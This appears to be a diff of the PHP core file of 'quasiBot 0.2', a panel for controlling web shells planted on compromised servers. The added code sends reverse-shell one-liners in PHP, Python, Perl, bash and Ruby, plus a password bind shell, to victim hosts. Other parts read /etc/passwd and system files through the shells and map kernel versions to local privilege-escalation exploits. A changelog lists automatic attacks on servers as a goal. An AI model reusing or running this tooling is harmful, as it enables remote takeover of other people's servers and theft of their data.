@@ -2,18 +2,20 @@
 
 /*
 
-quasiBot 0.1 - config file
+quasiBot 0.2 - config file
 
 Todo:
- - Authorization system
- - Move Linux Exploit Suggestor to PHP language
- - Add Windows support to 'PWN' module
+ - Windows support in 'PWN' module
  - Automatic attacks on servers
- - Backdoors creation (backconnects)
- - Source code cleanup, it's still pretty shitty
+ - Optimization
  - ???
 
- ~Smash_
+ 0.2 Changelog:
+ - Added authorization system (Sessions / Cookie Auth)
+ - Added Shell Module (Spawn reverse shell / bind shell)
+ - Added Exploit Suggestor module
+
+ ~ smash[at]devilteam.pl
 
 */
 
@@ -29,13 +31,19 @@ define('PROXY_PORT', '9050');
 define('SQL_HOST', 'localhost');
 define('SQL_USER', 'root');
 define('SQL_PWD', 'fuckyou');
-define('SQL_DB', 'quasibot');rss()
+define('SQL_DB', 'quasibot');
+
+//Authentication, default credentials - quasi:changeme
+define('AUTH_ENABLE', 1); //0 - Disable, 1 - Enable
+define('AUTH_USER', 'quasi'); //Auth login
+define('AUTH_PASS', '4cb9c8a8048fd02294477fcb1a41191a'); //Auth password, MD5 encrypted
+define('AUTH_USECOOKIE', 0); //0 - Disable, 1 - Enable; Cookie Auth Protection
+define('AUTH_COOKIE', 'secretcookie=value'); //Cookie required for Cookie Auth
 
 //Misc
-define('LEX', 'lex.pl'); //Linux Exploit Suggester filename
-define('NMAP', 'nmap'); // Nmap path to file or executable
+define('NMAP', '/usr/bin/nmap'); // Nmap executable for Scan module
 define('CHECKSQL', 1); //Determine whenever mysql connection should be checked
-define('PWN_PHP_METHOD', 'system'); //Determine php function being used in PWN
+define('PWN_PHP_METHOD', 'system'); //Determine php function being used in PWN and Backdoor module
 
 //Functions
 
@@ -52,12 +60,42 @@ if (!mysql_select_db(SQL_DB)) {
 }
 if(mysql_num_rows(mysql_query('SHOW TABLES LIKE "bots"'))!=1) {
 	echo '[+] Creating tables';
-	//mysql_query('CREATE TABLE auth(login CHAR(30), pwd CHAR(255))');
 	mysql_query('CREATE TABLE bots(id MEDIUMINT NOT NULL AUTO_INCREMENT, url CHAR(200) NOT NULL, PRIMARY KEY (id))');
 }
 }
 mysql_close($conn);
 }
+}
+
+function auth() {
+
+    if(AUTH_ENABLE == 1) {
+
+    session_start();
+    session_regenerate_id();
+
+    if(!isset($_SESSION['user'])) {
+        header('Location: login.php');
+    }
+
+    if(isset($_GET['logout'])) {
+        session_start();
+        unset($_SESSION['user']);
+        session_destroy();
+        header('Location: login.php');
+    }
+
+    }
+
+    if(AUTH_USECOOKIE == 1) {
+   
+        $cooks = explode('=', AUTH_COOKIE);
+        if($_COOKIE[$cooks[0]] != $cooks[1]) {
+            die();
+        }
+
+    }
+
 }
 
 
@@ -412,7 +450,6 @@ function pwn() {
                             $check = mysql_query("SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
                             $row = mysql_fetch_array($check);
 
-                          //Info
                             if(isset($_POST['os']) == 'linux' && $row[1] != NULL) {
 
                             if(isset($_POST['info']) == 'yes') {
@@ -422,7 +459,7 @@ function pwn() {
                                 
                                 $z = explode("{:|", $v);
                                 echo $z[1].'&nbsp;&bull;&nbsp; <a href="'.$row[1].'?___=phpinfo">phpInfo</a></p>';
-                                $files = array('/etc/motd', '/etc/passwd', '/etc/group', '/etc/resolv.conf', '/etc/hosts');
+                                $files = array('/etc/motd', '/etc/passwd', '/etc/group', '/etc/resolv.conf', '/etc/hosts', '/etc/issue');
                                 foreach($files as $file) {
                                     $x = conn($row[1].'?_='.PWN_PHP_METHOD.'&__=cat%20'.$file);
                                     
@@ -432,7 +469,6 @@ function pwn() {
                                 }
                             }
 
-                            //Exploits
                             if(isset($_POST['exploit']) == 'yes') {
 
                             echo '</div></div><div class="post"><h2 class="title"><a href="#">Exploits</a></h2><div class="entry"><p class="meta"> Looking for exploits for kernel version</p>';
@@ -442,15 +478,7 @@ function pwn() {
                                 $z = explode("{:|", $v);
                             echo '<p><a href="http://www.cvedetails.com/version-search.php?vendor=linux&product=&version='.$z[1].'"> Search for vulnerabilities ('.$z[1].')</a></p>';
 
-if(exec('perl '.LEX.' -k '.escapeshellcmd($z[1]), $out)) {
-  foreach(array_slice($out,1,count($out)) as $rec)
- {
-     echo $rec.'<br />';
- } 
-    } else {
-  echo 'Couldn\'t execute Linux Exploit Suggester.<br />';
-  }
-
+                                search_exploits($z[1]);
 
                             echo '<br /><p><a href="http://pwnwiki.io/#!privesc/linux/index.md">More tips</a></p>';
                             }
@@ -664,7 +692,6 @@ $bigfiles = array('/apache/logs/access.log',
                                 }
                             }
 
-                            //Misc
                             if(isset($_POST['misc']) == 'yes') {
                                 
                                 $misc = conn($row[1].'?_='.PWN_PHP_METHOD.'&__=env');
@@ -885,4 +912,230 @@ echo '<p class=\'meta\'><b>'.htmlspecialchars($row['url']).'</b></p><pre>'.htmls
 
 }
 }
+
+function reverse_shell() {
+
+    if(isset($_POST['ip']) && isset($_POST['port']) && isset($_POST['func']) && isset($_POST['id'])) {
+
+    $conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
+    mysql_select_db(SQL_DB, $conn);
+
+    $check = mysql_query("SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
+    $row = mysql_fetch_array($check);
+    if($row !== false) {
+
+
+        if($_POST['func'] == 'php') {
+
+            $cmd = 'php+-r+%27%24sock%3Dfsockopen%28%22'.urlencode($_POST['ip']).'%22%2C'.urlencode($_POST['port']).'%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27';
+            conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.$cmd);
+            echo '<br /><p>PHP Reverse Shell Created - '.htmlspecialchars($_POST['ip']).':'.htmlspecialchars($_POST['port']).'</p>';
+
+        }
+
+        if($_POST['func'] == 'python') {
+
+            $cmd = 'python+-c+%27import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22'.urlencode($_POST['ip']).'%22%2C'.urlencode($_POST['port']).'%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B+os.dup2%28s.fileno%28%29%2C1%29%3B+os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27';
+            conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.$cmd);
+            echo '<br /><p>Python Reverse Shell Created - '.htmlspecialchars($_POST['ip']).':'.htmlspecialchars($_POST['port']).'</p>';
+
+            
+        }
+
+        if($_POST['func'] == 'perl') {
+
+            $cmd = 'perl+-e+%27use+Socket%3B%24i%3D%22'.urlencode($_POST['ip']).'%22%3B%24p%3D'.urlencode($_POST['ip']).'%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh+-i%22%29%3B%7D%3B%27';
+            conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.$cmd);
+            echo '<br /><p>Perl Reverse Shell Created - '.htmlspecialchars($_POST['ip']).':'.htmlspecialchars($_POST['port']).'</p>';
+
+
+        }
+
+        if($_POST['func'] == 'bash') {
+
+            $cmd = 'bash+-i+%3E%26+%2Fdev%2Ftcp%2F'.urlencode($_POST['ip']).'%2F'.urlencode($_POST['port']).'+0%3E%261';
+            conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.$cmd);
+            echo '<br /><p>Bash Reverse Shell Created - '.htmlspecialchars($_POST['ip']).':'.htmlspecialchars($_POST['port']).'</p>';
+
+        }
+
+        if($_POST['func'] == 'ruby') {
+
+            $cmd = 'ruby+-rsocket+-e%27f%3DTCPSocket.open%28%22'.urlencode($_POST['ip']).'%22%2C'.urlencode($_POST['ip']).'%29.to_i%3Bexec+sprintf%28%22%2Fbin%2Fsh+-i+%3C%26%25d+%3E%26%25d+2%3E%26%25d%22%2Cf%2Cf%2Cf%29%27';
+            conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.$cmd);
+            echo '<br /><p>Ruby Reverse Shell Created - '.htmlspecialchars($_POST['ip']).':'.htmlspecialchars($_POST['port']).'</p>';
+
+        }
+
+
+
+} else {
+    echo '<br/><p>No shell found for id <b>'.htmlspecialchars($_POST['id']).'</b></p>';
+    }
+}
+
+}
+
+function bind_shell() {
+
+        if(isset($_POST['bindpassword']) && isset($_POST['bindport']) && isset($_POST['bindid'])) {
+
+    $conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
+    mysql_select_db(SQL_DB, $conn);
+
+    $check = mysql_query("SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['bindid'])." LIMIT 1");
+    $row = mysql_fetch_array($check);
+    if($row !== false) {
+
+    $cmd = 'php+-r+%27%24sockfd+%3D+socket_create%28AF_INET%2C+SOCK_STREAM%2C+SOL_TCP%29%3B+socket_bind%28%24sockfd%2C+%22127.0.0.1%22%2C+%22'.htmlspecialchars($_POST['bindport']).'%22%29%3B+socket_listen%28%24sockfd%2C15%29%3B+%24client+%3D+socket_accept%28%24sockfd%29%3B+socket_write%28%24client%2C+%22Enter+password%3A+%22%29%3B+%24input%3Dsocket_read%28%24client%2Cstrlen%28%22'.htmlspecialchars($_POST['bindpassword']).'%22%29%2B2%29%3Bif%28trim%28%24input%29%3D%3D%22'.htmlspecialchars($_POST['bindpassword']).'%22%29%7Bsocket_write%28%24client%2C%22%5Cn%5Cn%22%29%3Bsocket_write%28%24client%2Cshell_exec%28%22date+%2Ft+%26+time+%2Ft%22%29.%22%5Cn%22.shell_exec%28%22ver%22%29.shell_exec%28%22date%22%29.%22%5Cn%22.shell_exec%28%22uname+-a%22%29%29%3Bsocket_write%28%24client%2C%22%5Cn%5Cn%22%29%3Bwhile%281%29%7B%24commandPrompt%3D%22%5BCMD%5D%3E+%22%3B%24maxCmdLen%3D'.htmlspecialchars($_POST['bindport']).'%3Bsocket_write%28%24client%2C%24commandPrompt%29%3B%24cmd%3Dsocket_read%28%24client%2C%24maxCmdLen%29%3Bif%28%24cmd%3D%3DFALSE%29%7Becho+%22The+client+Closed+the+conection%21%22%3Bbreak%3B%7Dsocket_write%28%24client%2Cshell_exec%28%24cmd%29%29%3B%7D%7Delse%7Becho+%22Wrong+password%21%22%3Bsocket_write%28%24client%2C%22Wrong+password%21+%5Cn%5Cn%22%29%3B%7D%27';      
+    conn($row[1].'?_='.PWN_PHP_METHOD.'&__='.$cmd);
+    echo '<br /><p>Connection completed</p>';    
+
+    } else {
+    echo '<br/><p>No shell found for id <b>'.htmlspecialchars($_POST['bindid']).'</b></p>';
+    }
+}
+}
+
+
+function search_exploits($kernel) {
+
+$exploits = array
+(
+array('2.2.', 'rip'),
+array('2.2.24', 'mremap_pte', 'http://www.exploit-db.com/exploits/160/'),
+array('2.4.', 'remap'),
+array('2.4.10', 'brk', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'w00t'),
+array('2.4.11', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.12', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.13', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.14', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.15', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.16', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'w00t'),
+array('2.4.17', 'newlocal', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'uselib24', 'w00t'),
+array('2.4.18', 'brk', 'km2', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'ptrace', 'ptrace_kmod', 'CVE-2007-4573' , 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'w00t'),
+array('2.4.19', 'ave', 'brk', 'newlocal', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'ptrace', 'ptrace_kmod', 'CVE-2007-4573' , 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'w00t'),
+array('2.4.20', 'ave', 'brk', 'mremap_pte', 'http://www.exploit-db.com/exploits/160/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'ptrace', 'ptrace_kmod', 'CVE-2007-4573' , 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'w00t'),
+array('2.4.21', 'brk', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'ptrace', 'ptrace_kmod', 'CVE-2007-4573' , 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'w00t'),
+array('2.4.22', 'brk', 'km2', 'loginx', 'loko', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'ptrace', 'ptrace_kmod', 'CVE-2007-4573' , 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'uselib24'),
+array('2.4.23', 'loko', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.24', 'loko', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.25', 'mremap_pte', 'http://www.exploit-db.com/exploits/160/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'uselib24'),
+array('2.4.26', 'mremap_pte', 'http://www.exploit-db.com/exploits/160/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.27', 'elfdump', 'mremap_pte', 'http://www.exploit-db.com/exploits/160/', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'uselib24'),
+array('2.4.28', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.29', 'elflbl', 'http://www.exploit-db.com/exploits/744/', 'expand_stack', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'smpracer', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'stackgrow2', 'uselib24'),
+array('2.4.30', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.31', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.32', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.33', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.34', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.35', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.36', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.37', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.4', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.5', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.6', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.7', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.8', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.4.9', 'pipe.c_32bit', 'CVE-2009-3547' , 'http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c', 'ptrace24', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436'),
+array('2.6.', 'newsmp', 'vconsole', 'CVE-2009-1046' ),
+array('2.6.0', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.1', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.10', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'exp.sh', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'krad', 'krad3', 'http://exploit-db.com/exploits/1397', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'stackgrow2', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'uselib24', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
+array('2.6.11', 'american-sign-language', 'CVE-2010-4347' , 'http://www.securityfocus.com/bid/45408/', 'ftrex', 'CVE-2008-4210' , 'http://www.exploit-db.com/exploits/6851', 'h00lyshit', 'CVE-2006-3626' , 'http://www.exploit-db.com/exploits/2013/', 'half_nelson', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/6851', 'half_nelson1', 'econet' , 'CVE-2010-3848' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson2', 'econet' , 'CVE-2010-3850' , 'http://www.exploit-db.com/exploits/17787/', 'half_nelson3', 'econet' , 'CVE-2010-4073' , 'http://www.exploit-db.com/exploits/17787/', 'krad', 'krad3', 'http://exploit-db.com/exploits/1397', 'pktcdvd', 'CVE-2010-3437' , 'http://www.exploit-db.com/exploits/15150/', 'pwned', 'sock_sendpage', 'wunderbar_emporium' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9435', 'sock_sendpage2', 'proto_ops' , 'CVE-2009-2692' , 'http://www.exploit-db.com/exploits/9436', 'udp_sendmsg_32bit', 'CVE-2009-2698' , 'http://downloads.securityfocus.com/vulnerabilities/exploits/36108.c', 'video4linux', 'CVE-2010-3081' , 'http://www.exploit-db.com/exploits/15024/'),
